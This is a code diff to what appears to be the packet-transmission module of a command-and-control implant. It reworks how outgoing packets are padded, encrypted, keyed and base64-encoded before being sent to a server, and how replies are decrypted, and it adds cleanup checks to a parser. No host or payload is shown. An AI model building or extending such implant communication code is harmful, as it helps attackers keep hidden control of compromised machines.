@@ -360,7 +360,7 @@ auto DECLFN Package::NewTask(
 auto DECLFN Package::Destroy( 
     _In_ PPACKAGE Package 
 ) -> VOID {
-    if ( !Package ) return;
+    if ( ! Package ) return;
 
     if ( Package->Buffer ) {
         Self->Hp->Free( Package->Buffer );
@@ -377,63 +377,83 @@ auto DECLFN Package::Destroy(
 }
 
 auto DECLFN Package::Transmit( 
-    _In_  PPACKAGE Package, 
-    _Out_ PVOID*   Response, 
-    _Out_ PUINT64  Size 
+    PPACKAGE Package, 
+    PVOID   *Response, 
+    UINT64  *Size 
 ) -> BOOL {
-    BOOL   Success    = FALSE;
-    PVOID  Base64Buff = NULL;
-    UINT64 Base64Size = 0;
-    PVOID  RetBuffer  = NULL;
-    UINT64 Retsize    = 0;
+    BOOL   Success       = FALSE;
+    PVOID  Base64Buff    = nullptr;
+    UINT64 Base64Size    = 0;
+    PVOID  RetBuffer     = nullptr;
+    UINT64 Retsize       = 0;
 
-    PVOID  TmpBuff = Package->Buffer;
-    SIZE_T TmpLen  = Package->Length;
+    ULONG EncryptOffset  = 36;
+    ULONG PlainLen       = Package->Length - EncryptOffset;
+    ULONG PaddedLen      = Self->Crp->CalcPadding(PlainLen);
+    ULONG TotalPacketLen = EncryptOffset + PaddedLen;
 
-    UCHAR* EncryptStart = (UCHAR*)( (UPTR)( TmpBuff ) + 36 ); 
-    ULONG  EncryptLen   = (ULONG )( TmpLen - 36 );  
+    Package->Buffer = Self->Hp->ReAlloc(Package->Buffer, TotalPacketLen);
+    Package->Length = TotalPacketLen;
 
-    Self->Crp->Encrypt( (UCHAR**)&EncryptStart, (ULONG*)&EncryptLen );
-    TmpLen = EncryptLen + 36;
+    PBYTE EncBuffer = (PBYTE)Self->Mm->Alloc(nullptr, TotalPacketLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if ( ! EncBuffer ) return FALSE;
 
-    Mem::Copy( (PVOID)( (UPTR)( TmpBuff ) + 36 ), EncryptStart, EncryptLen );
+    Mem::Copy( EncBuffer, Package->Buffer, EncryptOffset );
 
-    if ( ! Self->Session.Connected ) {
-        Mem::Copy( (PVOID)( (UPTR)( TmpBuff ) + ( TmpLen - sizeof( Self->Crp->LokKey ) ) ), Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
+    Mem::Copy( EncBuffer + EncryptOffset, B_PTR( Package->Buffer ) + EncryptOffset, PlainLen );
+
+    Self->Crp->AddPadding( EncBuffer + EncryptOffset, PlainLen, PaddedLen );
+    Self->Crp->Encrypt( EncBuffer + EncryptOffset, PaddedLen );
+
+    if (!Self->Session.Connected) {
+        if (TotalPacketLen < sizeof(Self->Crp->LokKey)) {
+            Self->Mm->Free(EncBuffer, 0, MEM_RELEASE);
+            return FALSE;
+        }
+
+        Mem::Copy(
+            EncBuffer + (TotalPacketLen - sizeof(Self->Crp->LokKey)),
+            Self->Crp->LokKey,
+            sizeof(Self->Crp->LokKey)
+        );
     }
 
-    PCHAR FinalPacket = this->Base64Enc( (const unsigned char*)TmpBuff, TmpLen );
-    if ( !FinalPacket ) return FALSE; 
+    PCHAR FinalPacket = this->Base64Enc((const UCHAR*)EncBuffer, TotalPacketLen);
+    if (!FinalPacket) {
+        Self->Mm->Free(EncBuffer, 0, MEM_RELEASE);
+        return FALSE;
+    }
 
-    UINT64 FinalPacketLen = this->Base64EncSize( TmpLen );
-    if ( Self->Tsp->Send( FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size ) ) {
+    UINT64 FinalPacketLen = this->Base64EncSize(TotalPacketLen);
+
+    if (Self->Tsp->Send(FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size)) {
         Success = TRUE;
     }
 
-    if ( FinalPacket ) {
-        Self->Hp->Free( FinalPacket );
-    }
+    Self->Hp->Free(FinalPacket);
+    Self->Mm->Free(EncBuffer, 0, MEM_RELEASE);
 
-    if ( Success && Base64Buff && Base64Size ) {
-        Retsize   = this->Base64DecSize((PCHAR)Base64Buff );
-        RetBuffer = Self->Hp->Alloc( Retsize );
-        if ( RetBuffer ) {
-            base64_decode( (PCHAR)Base64Buff, (PUCHAR)RetBuffer, Retsize );
-            if ( Response && Size ) {
-                UCHAR* DecBuff = (UCHAR*)( (UPTR)( RetBuffer ) + 36 );
-                ULONG  DecLen  = ( Retsize - 36 );
-                Self->Crp->Decrypt( DecBuff, &DecLen );
+    if (Success && Base64Buff && Base64Size) {
+        Retsize   = this->Base64DecSize((PCHAR)Base64Buff);
+        RetBuffer = Self->Hp->Alloc(Retsize);
+        if (RetBuffer) {
+            base64_decode((PCHAR)Base64Buff, (PUCHAR)RetBuffer, Retsize);
+            if (Response && Size) {
+                UCHAR* DecBuff = (UCHAR*)((UPTR)(RetBuffer) + EncryptOffset);
+                ULONG  DecLen  = Retsize - EncryptOffset;
+                Self->Crp->Decrypt(DecBuff, DecLen);
                 *Response = RetBuffer;
                 *Size     = Retsize;
             } else {
-                Self->Hp->Free( RetBuffer );
+                Self->Hp->Free(RetBuffer);
             }
         }
-        if ( Base64Buff ) Self->Hp->Free( Base64Buff );
+        if (Base64Buff) Self->Hp->Free(Base64Buff);
     }
 
     return Success;
 }
+
 
 auto DECLFN Package::Byte( 
     _In_ PPACKAGE Package, 
@@ -652,11 +672,14 @@ auto DECLFN Parser::Bytes(
 auto DECLFN Parser::Destroy( 
     _In_ PPARSER Parser 
 ) -> BOOL {
+    if ( ! Parser ) return FALSE;
+
     BOOL Success = TRUE;
 
     if ( Parser->Original ) {
         Success = Self->Hp->Free( Parser->Original );
         Parser->Original = nullptr;
+        Parser->Length   = 0;
     }
 
     if ( Parser ) {
